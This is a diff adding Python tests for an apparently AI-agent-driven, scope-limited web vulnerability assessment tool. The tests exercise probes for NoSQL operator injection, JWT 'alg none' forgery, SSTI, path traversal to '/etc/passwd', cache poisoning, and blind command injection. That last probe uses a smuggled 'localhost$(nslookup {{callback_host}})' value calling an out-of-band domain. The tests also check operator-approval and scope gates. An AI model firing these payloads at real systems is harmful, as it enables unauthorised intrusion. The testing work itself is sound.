@@ -322,3 +322,296 @@ async def test_ssti_tool_to_independent_verifier_end_to_end(monkeypatch, vulnera
     reports = await run_independent_verifiers([candidate], llm=None, tools_manager=manager,
                                               targets=[target + "/greeting"])
     assert reports[0]["status"] == expected, reports[0]["verifier_summary"]
+
+
+# --- NoSQL operator differential -------------------------------------------------
+
+def _nosql_urls(nonce: str) -> dict:
+    from app.services.agent.scoped_assessment.injection_probe import (
+        NOSQL_SEQUENCE, nosql_field_name, rename_query_field,
+    )
+
+    base = f"{ORIGIN}/users?sort=asc&name=prowl{nonce}"
+    return {step: rename_query_field(base, "name", nosql_field_name("name", step))
+            for step in NOSQL_SEQUENCE}
+
+
+def _mongo_server(*, parses_operators: bool):
+    def fetch(url, **_):
+        query = parse_qs(urlsplit(url).query)
+        if "name[$ne]" in query:
+            matches = ["alice", "bob"] if parses_operators else []
+        elif "name[$eq]" in query:
+            matches = [] if parses_operators else ["alice", "bob"]
+        else:
+            matches = []
+        token = "csrf-" + "x" * 20 + str(len(url))
+        return 200, f"<ul>{''.join(f'<li>{m}</li>' for m in matches)}</ul><i>{token}</i>".encode()
+    return fetch
+
+
+@pytest.mark.parametrize("parses,expected", [(True, True), (False, False)])
+def test_nosql_operator_differential(parses, expected):
+    from app.services.agent.scoped_assessment.injection_probe import probe_nosql
+
+    nonce = "feedbeef12345678"
+    result = probe_nosql(_nosql_urls(nonce), allowed_origin=ORIGIN, state=None,
+                         nonce=nonce, fetch=_mongo_server(parses_operators=parses))
+    assert result["proof_confirmed"] is expected
+    assert injection_proof_valid({**result, "nonce": nonce}) is expected
+    assert "sort=asc" in _nosql_urls(nonce)["true_first"]
+    assert "name%5B%24ne%5D=" in _nosql_urls(nonce)["true_first"]
+
+
+# --- JWT signature enforcement -------------------------------------------------
+
+def _b64(data: bytes) -> str:
+    import base64
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+
+def _token() -> str:
+    import json as _json
+    header = _b64(_json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
+    payload = _b64(_json.dumps({"sub": "alice", "exp": 4102444800}).encode())
+    return f"{header}.{payload}.{_b64(b'signature-bytes-here')}"
+
+
+def _jwt_server(*, verifies: bool):
+    import base64
+    import json as _json
+
+    good = _token()
+
+    def send(url, *, token, **_):
+        if token is None:
+            return 401, b"login required"
+        if token == good:
+            return 200, b'{"user":"alice","orders":[1,2]}'
+        parts = token.split(".")
+        try:
+            header = _json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
+            _json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
+        except Exception:
+            return 401, b"bad token"
+        if verifies:
+            return 401, b"bad signature"
+        if header.get("alg") == "none" or parts[2]:
+            return 200, b'{"user":"alice","orders":[1,2]}'
+        return 401, b"bad token"
+    return send
+
+
+@pytest.mark.parametrize("verifies,expected", [(False, True), (True, False)])
+def test_jwt_forgery_probe(verifies, expected):
+    from app.services.agent.scoped_assessment.jwt_probe import jwt_proof_valid, probe_jwt
+
+    session = {"headers": {"Authorization": f"Bearer {_token()}"}, "cookies": []}
+    result = probe_jwt(f"{ORIGIN}/api/me", allowed_origin=ORIGIN, session=session,
+                       nonce="0a1b2c3d4e5f6071", send=_jwt_server(verifies=verifies))
+    assert result["auth_enforced"] is True
+    assert result["proof_confirmed"] is expected
+    assert jwt_proof_valid({**result, "nonce": "0a1b2c3d4e5f6071"}) is expected
+
+
+def test_jwt_probe_requires_auth_enforcement_layer_ordering():
+    from app.services.agent.scoped_assessment.jwt_probe import probe_jwt
+
+    def public(url, *, token, **_):
+        return 200, b'{"public":true}'
+
+    session = {"headers": {"Authorization": f"Bearer {_token()}"}, "cookies": []}
+    result = probe_jwt(f"{ORIGIN}/api/me", allowed_origin=ORIGIN, session=session,
+                       nonce="0a1b2c3d4e5f6071", send=public)
+    assert result["auth_enforced"] is False and result["proof_confirmed"] is False
+    assert result["probes"] == []
+
+
+# --- Blind command injection OOB ------------------------------------------------
+
+def test_cmdi_oob_template_and_policy_require_lookup():
+    from app.services.agent.scoped_assessment.cmdi_oob import plan_oob_cmdi
+
+    field, template = plan_oob_cmdi(f"{ORIGIN}/ping?host=localhost", parameter="host",
+                                    shell="posix_subshell")
+    assert field == "host" and template == "localhost$(nslookup {{callback_host}})"
+    with pytest.raises(ValueError):
+        plan_oob_cmdi(f"{ORIGIN}/ping?host=localhost", parameter="host", shell="bash -c")
+    assert "oob_callback" in PROOFS_BY_CLASS["command_injection"]
+
+
+def test_cmdi_oob_callback_rejects_plain_url_fetch():
+    store = _Store()
+    domain = "abc123.oast.example"
+    cand = SimpleNamespace(vulnerability_class="command_injection", title="Blind command injection in ping",
+                           description="", target=f"{ORIGIN}/ping", evidence_ids=[], nonce="n")
+
+    def records(planted_value):
+        store.records.clear()
+        store.add("r", "oob_register", {"payload_domain": domain, "session_id": "s"}, created_at=1)
+        store.add("p", "http_exchange", {"request": {"url": f"{ORIGIN}/ping?host={planted_value}",
+                                                       "method": "GET"}}, created_at=2)
+        store.add("q", "oob_poll", {"session_id": "s", "interactions": [
+            {"protocol": "dns", "unique_id": "abc123"}]}, created_at=3)
+
+    proof = {"kind": "oob_callback", "register_id": "r", "plant_id": "p", "poll_id": "q"}
+    records(f"localhost%24%28nslookup+x.{domain}%29")
+    assert validate_proof(store, cand, proof, ["r", "p", "q"]) == (True, "")
+    records(f"https://{domain}/")
+    ok, why = validate_proof(store, cand, proof, ["r", "p", "q"])
+    assert not ok and "nslookup" in why
+
+
+# --- POST bodies ----------------------------------------------------------------
+
+def test_body_mutation_replace_mode_for_traversal():
+    from app.services.agent.scoped_assessment.body_probe import _mutate_form, _mutate_json
+
+    assert _mutate_form(b"file=report.txt&x=1", "file", "../../etc/passwd", replace=True) == \
+        b"file=..%2F..%2Fetc%2Fpasswd&x=1"
+    assert _mutate_json(b'{"tpl":"hi","n":1}', "/tpl", "{{1*2}}") == b'{"tpl":"hi{{1*2}}","n":1}'
+
+
+@pytest.mark.asyncio
+async def test_post_body_injection_requires_operator_approval_and_confirms(monkeypatch):
+    import base64
+    import json as _json
+
+    from app.services.agent.assessment_scope import register_scope
+    from app.services.agent.coverage_cells import (
+        claim_coverage_cell_leases, seed_parameter_coverage_cells,
+    )
+    from app.services.agent.scoped_assessment import body_probe
+    from app.services.agent.tools import ASMToolsManager
+
+    target = "https://app.example.test"
+    brain = EngagementBrain(target=target)
+    seed_parameter_coverage_cells(brain, [{
+        "method": "POST", "path": "/api/render", "host": "app.example.test",
+        "name": "/template", "location": "body_json", "source": "browser_traffic",
+        "identity": "anonymous", "testable": True, "artifact_id": "cap1",
+    }])
+    lease = claim_coverage_cell_leases(
+        brain, ["server_injection"], allowed_test_types=frozenset({"ssti"}),
+    )["server_injection"]
+    assert lease is not None
+    manager = ASMToolsManager()
+    manager._fallback_target = target
+    manager._capability_map = {"target": target, "scope": target}
+    manager._engagement_brain = brain.to_dict()
+    register_scope(manager, "app.example.test")
+    exchange = _json.dumps({
+        "method": "POST", "resource_type": "fetch", "url": target + "/api/render",
+        "request_content_type": "application/json",
+        "request_body_base64": base64.b64encode(b'{"template":"Hello"}').decode(),
+    }).encode()
+    monkeypatch.setattr(manager, "_scoped_exchange", lambda artifact_id, identity: exchange)
+
+    def observe_post(url, mime, body, allowed, state, **_):
+        value = _json.loads(body)["template"]
+        match = re.search(r"\{\{(\d+)\*(\d+)\}\}", value)
+        out = str(int(match.group(1)) * int(match.group(2))) if match else value
+        return {"status": 200, "_private_body": f'{{"html":"{out}"}}'.encode()}
+
+    monkeypatch.setattr(body_probe, "_observe_post", observe_post)
+    denied = await manager.scoped_injection_probe_assigned(lease.coverage_cell_id, lease.id)
+    assert denied["error"] == "operator_approval_required"
+    manager._scoped_body_replay_paths = {"/api/render"}
+    result = await manager.scoped_injection_probe_assigned(lease.coverage_cell_id, lease.id)
+    assert result["success"] is True and result["proof_confirmed"] is True
+    assert result["probe_result"]["recipe"] == "jinja_twig"
+
+
+# --- Cache-poisoning probe safety -------------------------------------------------
+
+@pytest.mark.asyncio
+async def test_cache_poisoning_probe_uses_unique_cache_buster(monkeypatch):
+    import json as _json
+
+    from app.services.agent.tools import ASMToolsManager
+
+    seen = []
+
+    class _Client:
+        def __init__(self, *a, **k):
+            pass
+
+        async def __aenter__(self):
+            return self
+
+        async def __aexit__(self, *a):
+            return False
+
+        async def get(self, url, headers=None):
+            seen.append(url)
+            return httpx.Response(200, text="ok", request=httpx.Request("GET", url))
+
+        async def request(self, method, url, **kwargs):
+            seen.append(url)
+            return httpx.Response(200, text="ok", request=httpx.Request(method, url))
+
+    monkeypatch.setattr(httpx, "AsyncClient", _Client)
+    out = _json.loads(await ASMToolsManager().test_cache_poisoning(
+        "https://app.example.test/home", probe_headers=["X-Forwarded-Host", "X-Host"]))
+    assert out["headers_probed"] == 2
+    assert seen and all("prowlcb=" in url for url in seen)
+    busters = {parse_qs(urlsplit(url).query)["prowlcb"][0] for url in seen}
+    assert len(busters) == 3  # one per header probe pair, one for the fat GET
+
+
+@pytest.mark.asyncio
+async def test_jwt_tool_to_independent_verifier_end_to_end(monkeypatch):
+    from functools import partial
+
+    from app.services.agent.assessment_scope import register_scope
+    from app.services.agent.assessment_sessions import identity_registry
+    from app.services.agent.engagement_brain import engagement_brain_from_dict
+    from app.services.agent.independent_verify import run_independent_verifiers
+    from app.services.agent.scoped_assessment import jwt_probe
+    from app.services.agent.tools import ASMToolsManager
+
+    target = "https://app.example.test"
+    endpoint = target + "/api/me"
+    manager = ASMToolsManager()
+    manager._fallback_target = target
+    manager._capability_map = {"target": target, "scope": target, "pages_visited": [endpoint]}
+    manager._engagement_brain = EngagementBrain(target=target).to_dict()
+    register_scope(manager, "app.example.test")
+    identity_registry(manager).register(
+        "alice", target, headers={"Authorization": f"Bearer {_token()}"})
+    monkeypatch.setattr(jwt_probe, "probe_jwt",
+                        partial(jwt_probe.probe_jwt, send=_jwt_server(verifies=False)))
+    assert (await manager.scoped_jwt_probe(endpoint, "anonymous"))["error"] == \
+        "registered_identity_required"
+    assert (await manager.scoped_jwt_probe(target + "/unseen", "alice"))["error"] == \
+        "observed_endpoint_required"
+    hunter = await manager.scoped_jwt_probe(endpoint, "alice")
+    assert hunter["success"] is True and hunter["proof_confirmed"] is True
+    active = engagement_brain_from_dict(manager._engagement_brain)
+    candidate = submit_candidate(
+        active, title="JWT signature not verified on /api/me (alg none accepted)",
+        target=endpoint, vulnerability_class="jwt", identity="alice",
+        evidence_ids=[hunter["evidence_id"]],
+    )
+    manager._engagement_brain = active.to_dict()
+    reports = await run_independent_verifiers([candidate], llm=None, tools_manager=manager,
+                                              targets=[endpoint])
+    assert reports[0]["status"] == "confirmed", reports[0]["verifier_summary"]
+
+
+def test_reworded_duplicate_cannot_reopen_confirmed_candidate():
+    brain = EngagementBrain(target=ORIGIN)
+    first = submit_candidate(brain, title="SSTI in greeting", target=f"{ORIGIN}/greeting",
+                             parameter="query:message", vulnerability_class="ssti",
+                             description="original claim", specialist="server_injection")
+    raw = brain.candidates[0]
+    raw["status"] = "confirmed"
+    brain.candidates = [raw]
+    again = submit_candidate(brain, title="Template injection via message param",
+                             target=f"{ORIGIN}/greeting", parameter="query:message",
+                             vulnerability_class="ssti", description="different text",
+                             specialist="vanguard_external", evidence_ids=["e9"])
+    assert again.id == first.id
+    assert again.status == "confirmed"
+    assert again.description == "original claim" and again.specialist == "server_injection"
+    assert "e9" in again.evidence_ids
